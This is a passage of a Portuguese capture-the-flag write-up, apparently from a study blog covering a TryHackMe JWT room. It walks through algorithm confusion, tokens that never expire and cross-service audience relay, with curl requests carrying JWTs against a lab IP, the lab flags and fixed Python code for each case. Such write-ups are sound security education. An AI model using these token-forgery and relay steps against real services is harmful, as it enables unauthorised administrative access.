+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, here is your flag: THM{f592dfe2-ec65-4514-a135-70ba358f22c4}&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="desenvolvimento-do-erro-3">Desenvolvimento do erro<span class="hx:absolute hx:-mt-20" id="desenvolvimento-do-erro-3"></span>
+    <a href="#desenvolvimento-do-erro-3" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>O erro neste exemplo é semelhante ao do exemplo 3, mas um pouco mais complexo. Embora o algoritmo <code>None</code> não seja permitido, o problema principal decorre de algoritmos de assinatura simétrica e assimétrica sendo permitidos, conforme mostrado no exemplo abaixo:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt.decode<span style="color:#f92672">(</span>token, self.secret, algorithms<span style="color:#f92672">=[</span><span style="color:#e6db74">&#34;HS256&#34;</span>, <span style="color:#e6db74">&#34;HS384&#34;</span>, <span style="color:#e6db74">&#34;HS512&#34;</span>, <span style="color:#e6db74">&#34;RS256&#34;</span>, <span style="color:#e6db74">&#34;RS384&#34;</span>, <span style="color:#e6db74">&#34;RS512&#34;</span><span style="color:#f92672">])</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="correção-4">Correção<span class="hx:absolute hx:-mt-20" id="correção-4"></span>
+    <a href="#corre%c3%a7%c3%a3o-4" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>É necessário inserir um pouco mais de lógica no código para que não haja confusão.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>header <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>get_unverified_header(token)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>algorithm <span style="color:#f92672">=</span> header[<span style="color:#e6db74">&#39;alg&#39;</span>] 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;RS&#34;</span> <span style="color:#f92672">in</span> algorithm: 
+</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>public_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;RS256&#34;</span>, <span style="color:#e6db74">&#34;RS384&#34;</span>, <span style="color:#e6db74">&#34;RS512&#34;</span>]) 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;HS&#34;</span> <span style="color:#f92672">in</span> algorithm: 
+</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>secret, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>, <span style="color:#e6db74">&#34;HS384&#34;</span>, <span style="color:#e6db74">&#34;HS512&#34;</span>]) 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>] 
+</span></span><span style="display:flex;"><span> flag <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>db_lookup(username, <span style="color:#e6db74">&#34;flag&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="perguntas-2">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-2"></span>
+    <a href="#perguntas-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>No decorrer dessas lições já obtemos as <code>flags</code> para responder todas as perguntas.</p>
+<h2 data-hextra-search-id="duração-de-jwt">Duração de JWT<span class="hx:absolute hx:-mt-20" id="duração-de-jwt"></span>
+    <a href="#dura%c3%a7%c3%a3o-de-jwt" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>O tempo de vida de um token deve ser calculado antes da verificação da sua assinatura, o campo <code>exp</code>define o tempo de vida do token e, verifica se o token em questão ainda é válido. Um problema frequente é o valor de expiração ser muito longo ou até mesmo não ser definido (nunca expirar).</p>
+<p>Uma forma citada na aula, para expirar o token antes do tempo definido, seria manter uma lista de tokens a serem bloqueados (serve-side), porém isso quebraria o propósito dos JWTs em serem descentralizados. Sendo assim, o ideal e recomendado é definir corretamente o tempo de expiração de cada token, para cada aplicação diferente.</p>
+<h3 data-hextra-search-id="exemplo-6">Exemplo 6<span class="hx:absolute hx:-mt-20" id="exemplo-6"></span>
+    <a href="#exemplo-6" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Nesse exemplo já temos nosso JWT, nesse caso basta realizarmos um requisição para API para obter a <code>flag</code>.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/FolderShare/Tryhack Me/JWT-rooms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> http://10.10.86.110/api/v1.0/example6?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, here is your flag: THM{a450ae48-7226-4633-a63d-38a625368669}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h3 data-hextra-search-id="desenvolvimento-do-erro-4">Desenvolvimento do erro<span class="hx:absolute hx:-mt-20" id="desenvolvimento-do-erro-4"></span>
+    <a href="#desenvolvimento-do-erro-4" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Definir um valor para o token expirar, como mencionado, caso não seja definido o token será persistente (nunca expira).</p>
+<h3 data-hextra-search-id="correção-5">Correção<span class="hx:absolute hx:-mt-20" id="correção-5"></span>
+    <a href="#corre%c3%a7%c3%a3o-5" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O código abaixo demonstra a forma de corrigir a vulnerabilidade.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>lifetime <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now() <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>timedelta(minutes<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> { 
+</span></span><span style="display:flex;"><span>		   <span style="color:#e6db74">&#39;username&#39;</span> : username, 
+</span></span><span style="display:flex;"><span>		   <span style="color:#e6db74">&#39;admin&#39;</span> : <span style="color:#ae81ff">0</span>, 
+</span></span><span style="display:flex;"><span>		   <span style="color:#e6db74">&#39;exp&#39;</span> : lifetime } 
+</span></span><span style="display:flex;"><span>access_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, self<span style="color:#f92672">.</span>secret, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h2 data-hextra-search-id="cross-service-relay-attacks">Cross-Service Relay Attacks<span class="hx:absolute hx:-mt-20" id="cross-service-relay-attacks"></span>
+    <a href="#cross-service-relay-attacks" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>O ataque ocorre quando um JWT é gerado e reutilizado em outra aplicação, que o emissor não deveria ter acesso com aquele JWT. Isso pode acontecer quando o serviço receptor não verifica corretamente o <strong>emissor</strong> (issuer) e o <strong>público</strong> (audience) do token.
+Outro exemplo é um JWT com <code>admin:true</code>, onde o usuário possui privilégios administrativos na primeira aplicação, se aplicação não realizar as devidas verificações, o atacante pode tentar se passar como usuário que possui privilégios administrativos nessa segunda aplicação, sendo que não deveria ter essas permissões.</p>
+<h3 data-hextra-search-id="exemplo-7">Exemplo 7<span class="hx:absolute hx:-mt-20" id="exemplo-7"></span>
+    <a href="#exemplo-7" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Para esse exemplo teremos duas aplicações,  <code>example7_appA</code> e <code>example7_appB</code>, além disso teremos mais um campo em nossa requisição: <code>application : appX</code></p>
+<p>Primeiro vamos gerar nosso token no servidor centralizado de autenticação: <code>example7</code>, para a aplicação A.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password7&#34;, &#34;application&#34; : &#34;appA&#34;}&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  http://10.10.86.110/api/v1.0/example7
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Analisando o JWT vemos que temos um novo campo  no payload: <code>aud</code></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  &#34;username&#34;: &#34;user&#34;,
+</span></span><span style="display:flex;"><span>  &#34;admin&#34;: 0,
+</span></span><span style="display:flex;"><span>  &#34;aud&#34;: &#34;appA&#34;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Realizando uma requisição com esse JWT para aplicação A recebemos a resposta da aplicação.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>http://10.10.86.110/api/v1.0/example7_appA?username<span style="color:#f92672">=</span>user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome user, you are not an admin&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Realizando a mesma requisição, agora para a aplicação B nosso token não é aceito.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>http://10.10.86.110/api/v1.0/example7_appB?username<span style="color:#f92672">=</span>user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;JWT could not be read: Invalid audience&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Agora iremos gerar um novo JWT, porém para a aplicação B.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password7&#34;, &#34;application&#34; : &#34;appB&#34;}&#39;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  http://10.10.86.110/api/v1.0/example7
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Assim como anteriormente nosso payload possui o campo <code>aud</code> e além disso temos privilégios administrativos.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  &#34;username&#34;: &#34;user&#34;,
+</span></span><span style="display:flex;"><span>  &#34;admin&#34;: 1,
+</span></span><span style="display:flex;"><span>  &#34;aud&#34;: &#34;appB&#34;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Nosso JWT é lido normalmente pela aplicação B.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>http://10.10.86.110/api/v1.0/example7_appB?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, but there is no flag for you here&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Agora vamos tentar utiliza-lo para tentar acessar a aplicação A.</p>
